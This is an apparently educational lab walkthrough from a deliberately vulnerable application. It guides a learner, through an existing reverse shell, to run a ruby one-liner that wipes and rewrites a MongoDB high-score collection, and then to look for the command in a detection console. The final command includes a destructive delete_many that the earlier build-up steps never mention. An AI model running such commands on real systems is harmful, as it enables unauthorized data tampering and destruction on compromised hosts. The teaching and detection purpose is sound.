# 🔥 Vulnerable Labs: Updating High Scores!
*A deliberately insecure application for security education and demos*

---

## 💀 About the Challenge

In this exercise you'll learn how to construct ruby code to update high scores in the Mongo Database.

In situations where there are constraints on the ability to install additional tools (such as applicaton whitelisting) attackers 
pivot to Living Off The Land (LOTL) techniques. In this case you'll execute your own ruby code to update the MongoDB with a new high score.

This could extend to other situations, like interacting with other non-public resources that are accessible from the compromised host 
e.g., on-premises resources over a VPN, Direct Connect, or Express Route. 



### 🎯 Your Mission

1. Ensure your reverse shell is still active. You can re-run the reverse shell commands from [2-Reverse-Shell.md](2-Reverse-Shell.md) if needed.
2. On your laptop, open a text editor / notepad and open the file [webserver.rb](../web/webserver.rb).
3. Copy from line 3:
```ruby 
require 'mongo'; 
```
4. Copy from line 25:
```ruby 
client = Mongo::Client.new(ENV['MONGODB_CONN']);
```
5. Copy from line 26:
```ruby 
db = client.use('game_db');
```
6. Copy from line 27:
```ruby
scores_collection = db[:player_scores];
```
7. Append the following (change the name if you like):
```ruby
scores_collection.insert_one({\"player\":\"Alice\",\"score\":1000});
```
8. Prepend the start of the command with:
```ruby
ruby -e "
```
9. Append the following to the end of the command:
```ruby
"
```
10. Ensure your final command looks like:
```ruby
ruby -e "require 'mongo'; client = Mongo::Client.new(ENV['MONGODB_CONN']); db = client.use('game_db'); scores_collection = db[:player_scores]; scores_collection.delete_many({});  scores_collection.insert_one({\"player\":\"Alice\",\"score\":1000}); "
```

11. Check the reverse shell is still active and run the command:
```bash
ruby -e "require 'mongo'; client = Mongo::Client.new(ENV['MONGODB_CONN']); db = client.use('game_db'); scores_collection = db[:player_scores]; scores_collection.delete_many({});  scores_collection.insert_one({\"player\":\"Alice\",\"score\":1000}); "
```
12. A successful execution will return a result similar to:
```bash
<insert_one({\"player\":\"Alice\",\"score\":1000}) 
```
13. Browse to the webserver_IP and check your high score. 

Congratulations, you've completed this challenge. Can you now find the command you executed in Wiz? How long did it take to appear in the console?

### 💥 Hints & Tips

- We need to put a semicolon ; after each command. The semicolon is the equivalent to a linebreak when compiled and executed by the ruby interpreter. 